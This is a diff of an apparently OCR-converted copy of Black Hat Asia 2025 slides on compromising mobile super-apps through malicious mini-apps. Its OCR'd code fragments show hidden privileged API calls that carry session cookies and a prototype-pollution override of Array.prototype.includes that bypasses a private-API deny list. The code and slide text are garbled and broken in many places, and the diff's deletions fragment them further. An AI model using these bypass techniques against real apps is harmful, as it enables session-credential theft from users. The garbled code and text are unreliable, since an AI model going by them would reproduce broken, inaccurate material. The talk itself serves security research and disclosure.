@@ -8,19 +8,24 @@ year: 2025
 source_pdf: "Black Hat Asia 2025 Slides/Wei Wen & Xiangyu Cao & Jiangchunxi Hou & Zixi Liao & Yingyan Song & Zhongcheng Li & Yijie Zhao & Bin Ma_Mini-App But Great Impact New Ways to Compromise Mobile Apps.pdf"
 pages: 26
 sha256: "c08d7229adc1dab3895c58b2ff02f71e58b7f18617fcd45c92a47f3580545637"
-text_chars: 9500
-ocr_pages: 12
+text_chars: 8269
+ocr_pages: 9
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 85.7
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-12T00:47:36Z"
+converted_at: "2026-08-12T03:58:34Z"
 ---
 # Mini-App But Great Impact New Ways to Compromise Mobile Apps
 
 **Speakers:** Wei Wen, Xiangyu Cao, Jiangchunxi Hou, Zixi Liao, Yingyan Song, Zhongcheng Li, Yijie Zhao, Bin Ma  
 **Conference:** Black Hat ASIA 2025  
 **Source:** `Black Hat Asia 2025 Slides/Wei Wen & Xiangyu Cao & Jiangchunxi Hou & Zixi Liao & Yingyan Song & Zhongcheng Li & Yijie Zhao & Bin Ma_Mini-App But Great Impact New Ways to Compromise Mobile Apps.pdf` (26 pages)
+
 
 ## Slide 1
 
@@ -30,11 +35,10 @@ IES Red Team of ByteDance
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-blackhat
-ASIA 2025
 APRIL 3-4, 2025
 BRIEFINGS
 Mini-App But Great Impact:
@@ -180,14 +184,6 @@ Permission Check
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-“black hat Ss FS
-ASIA 2025 SS oe
-2. Risk Assessment
-```
-
 ## Slide 9
 
 ### Comparsion and Risk Assessment
@@ -225,21 +221,17 @@ File Manager Risk Detail
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 pifcuchat File Manager Risk Detail
-ASIA 2025 @
 OQ Mini-App Runtime
-Super-App 7
 : Malicious :
-fos] [ce
 quick open
-OG
 Credential Leak
 Remote Code
 Execuation
-#BHAS @bBlackHatEvents
 ```
 
 ## Slide 12
@@ -269,21 +261,14 @@ full access to response data 9/9
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 bene Network Risk Detail
-ASIA 2025 @
 © Mini-App Runtime
-ner
 Super-App
-container eanainer
-: Malicious ; : _
-— : MiniApp 2 <)> MiniApp
-I
 quick open
-O38 XY
-#BHAS @bBlackHatEvents
 ```
 
 ## Slide 14
@@ -291,14 +276,6 @@ O38 XY
 # 3. Further Exploit
 
 #BHAS   @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-“plackhat
-ASIA 2025
-3. Further Exploit
-```
 
 ## Slide 15
 
@@ -320,7 +297,8 @@ ASIA 2025
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 pisakhat Invoke Sample
@@ -336,7 +314,6 @@ _ method: "GET",
 Page
 onLoad: function(){
 this.getWeatherData();
-},
 // invoke documented API
 getWeatherData: function(){ getUserData2: function() {
 : i // invoke hiden API from global privileged variables
@@ -346,10 +323,6 @@ method: "GET", method: "nativeRequest",
 success: (res)=>{ parms: {
 // : H url: "xxx",
 — withCredentials: true
-); //ues
-PH
-}
-#BHAS @bBlackHatEvents
 ```
 
 ## Slide 17
@@ -358,65 +331,43 @@ PH
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-ASIA 2025
 Mini-App
 arty
 getWeatherData: function(){
 [x. request ({
-url: "“uri_for_weather_data",
 method: "GET",
 success: (res)=>{},
-4);
-},
 1-st Party
-getUserData1: function(){
-x. HidenRequest ({ 1
 url: "uri_for_user_data",
 method: "GET",
 success: (res)=>{},
-});
-},
 Malicious
-globalThis. testval.callNative({
 Method: “nativeRequest",
 parms: {
-urls "xxx",
 method: "GET",
 withCredentials: true
-}
-/ fue
 })
 function request(args){
 invokeMethod("request", args, False);
-}
-function HidenRequest (args) {
 invokeMethod("'NativeRequest", args, True);
-}
 callNative
 method: "nativeRequest", <
 parms: {
-urls hood,
 method: "GET",
 withCredentials: isInnerApp
-},
-@Javascriptinterface
 public void sendRequest(String a, String b){
-haus
 if (withCredentials) <4
 Hidden API Exploit
 Framework
 Super App
-connection. setRequestProperty("Cookie", getSessionCookies());
-/ [aoe
 String response = readResponse(connection) ;
 if (response != null)
 String data = response.content;
 sendResponseToJs(callid, data);
-#BHAS @bBlackHatEvents
 ```
 
 ## Slide 18
@@ -427,15 +378,14 @@ sendResponseToJs(callid, data);
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 bifakhat Prototype Pollution
-ASIA 2025 @
 1.Whitelist bypass
 2.Private API parameter hijacking
 3.User credentials leakage
-#BHAS @bBlackHatEvents
 ```
 
 ## Slide 19
@@ -444,7 +394,8 @@ ASIA 2025 @
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 piseichat Prototype Pollution Demo
@@ -460,16 +411,12 @@ Ki \
 if(search=== "aaa"){
 return false;
 ) |
-}
 > let whiteList = ({"aaa",) "bbb",
 return in an search, Index);
-MeEEC.’ |
-‘ |
 > whiteList. includes ("bbb")
 < true
 [> whiteList.includes("aaa") | /
 « false ~
-#BHAS @bBlackHatEvents
 ```
 
 ## Slide 20
@@ -478,28 +425,22 @@ Prototype Pollution in Mobile Security
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-ASIA 2025
 Page({
 data:{
 userName: null,
 isRequesting: false
-},
 onLoad: function(){
-this. getUserData() ;
-},
 getUserData: function(){
 Prototype Pollution in Mobile Security
 Mini-App Framework
 globalThis. testval={
 callNative: function(method, parms) {
 // wos
-_>{if (private_api_list. includes (method) ) {|-
 throw “API deny"; 7
-}
 var r=
 d(method, parms); 3
 return ol(r) ? r.then(function(t) {
@@ -507,51 +448,35 @@ Array.prototype.src_includes = Array.prototype. includes;
 Array.prototype.includes = function(search, Index) {
 if(search=== "nativeRequest") {
 return false;
-\
 return open(e,t); —__...-""
-_Pp[ople nds Jen
-5,
-invHandlers, function(e, t){
 var r = Number(e);
-n= o.get (ih);
 };
 (globalThis.testval.callNative({ |
 method: "nativeRequest",
 parms: {
 urls "Xxx",
 withCredentials:
-i,
 success: (res)=>{
 const userName = res.data.userName;
 this.setData({
 userName:
 true
 userName,
-3
-},
 fail: (err)=>{
 console. log("get fail", err);
 this.setData({isRequesting: false});
-}
-});
-},
-});
 “return Array.prototype.src_includes.call(this, search,
 e(r,t); \
 yo : n(uc(t));
 call success }
 @JavascriptInterface Super App
 public void sendRequest(String a,\ String b){
-Theva a
 {if (withCredentials) {
 connection.setRequestProperty("Cookie", getSessionCookies());
-}
-Mavis
 {String response = readResponse(connection) ;
 if (response != null) {
 String data = response.content;
 sendResponseToJs(callId, data);
-#BHAS @bBlackHatEvents
 ```
 
 ## Slide 21
@@ -594,15 +519,6 @@ Strictly control the access authorization for Mini-Apps, including access rights
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-7
-pbx hat
-ASIA 2025
-5. Conclusion
-```
-
 ## Slide 25
 
 ### Conclusion
@@ -623,11 +539,10 @@ ASIA 2025
 
 #BHAS   @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-- blsekhat:
-ASIA 2025
 APRIL 3-4, 2025
 BRIEFINGS
 Thanks for Listening
